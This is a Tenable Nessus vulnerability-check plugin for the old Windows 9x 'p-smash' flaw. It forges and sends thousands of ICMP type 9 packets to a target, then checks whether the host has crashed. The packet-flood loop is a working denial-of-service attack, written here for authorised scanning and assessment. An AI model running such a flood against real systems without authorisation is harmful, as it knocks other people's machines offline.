#
# (C) Tenable Network Security, Inc.
#

# p-smash

# Script audit and contributions from Carmichael Security <http://www.carmichaelsecurity.com>
#      Erik Anderson <eanders@carmichaelsecurity.com>
#      Added link to the Microsoft Knowledgebase
#
# According to "Paulo Ribeiro" <prrar@NITNET.COM.BR> on VULN-DEV,
# Windows 9x cannot handle ICMP type 9 messages.
# This should slow down Windows 95 and crash Windows 98
#

include("compat.inc");

if (description)
{
 script_id(11024);
 script_version("$Revision: 1.22 $");
 script_cvs_date("$Date: 2016/11/02 14:37:08 $");

 script_osvdb_id(55309);

 script_name(english:"Microsoft Windows ICMP Type 9 Packet Remote DoS");
 script_summary(english:"Floods the remote machine with ICMP 9");

 script_set_attribute(attribute:"synopsis", value:"The remote host is affected by a denial of service vulnerability.");
 script_set_attribute(attribute:"description", value:
"It was possible to crash the remote machine by flooding it with ICMP
type 9 packets. An attacker may use this attack to make this host
crash continuously, preventing you from working.");
 script_set_attribute(attribute:"see_also", value:"http://support.microsoft.com/default.aspx?scid=KB;en-us;q216141");
 script_set_attribute(attribute:"see_also", value:"http://seclists.org/vuln-dev/2001/Feb/33" );
 script_set_attribute(attribute:"solution", value:"Upgrade to a supported version of Windows.");
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:C");

 script_set_attribute(attribute:"plugin_publication_date", value:"2002/06/09");

 script_set_attribute(attribute:"potential_vulnerability", value:"true");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_end_attributes();

 script_category(ACT_KILL_HOST);
 script_copyright(english:"This script is Copyright (C) 2002-2016 Tenable Network Security, Inc.");
 script_family(english:"Windows");

 script_require_keys("Settings/ParanoidReport");
# script_add_preference(name:"Flood length :", 	type:"entry", value:"5000");
# script_add_preference(name:"Data length :", 	type:"entry", value:"500");

 exit(0);
}

include("audit.inc");
include("global_settings.inc");

if ( TARGET_IS_IPV6 ) exit(0);
if (report_paranoia < 2) audit(AUDIT_PARANOID);

start_denial();

fl = script_get_preference("Flood length :");
if (! fl) fl = 5000;
dl = script_get_preference("Data length :");
if (! dl) dl = 500;

src = this_host();
dst = get_host_ip();
id = 804;
s = 0;
d = crap(dl);
for (i = 0; i < fl; i = i + 1)
{
 id = id + 1;
 ip = forge_ip_packet(ip_v:4, ip_hl:5, ip_tos:0, ip_off:0,ip_len:20,
                      ip_p:IPPROTO_ICMP, ip_id:id, ip_ttl:0x40,
		      ip_src:this_host());
 icmp = forge_icmp_packet(ip:ip, icmp_type:9, icmp_code:0,
	 		  icmp_seq: s, icmp_id:s, data:d);
 s = s + 1;
 send_packet(icmp, pcap_active: 0);
}

sleep(1);

alive = end_denial();
if(!alive)
{
  security_hole();
  set_kb_item(name:"Host/dead", value:TRUE);
}
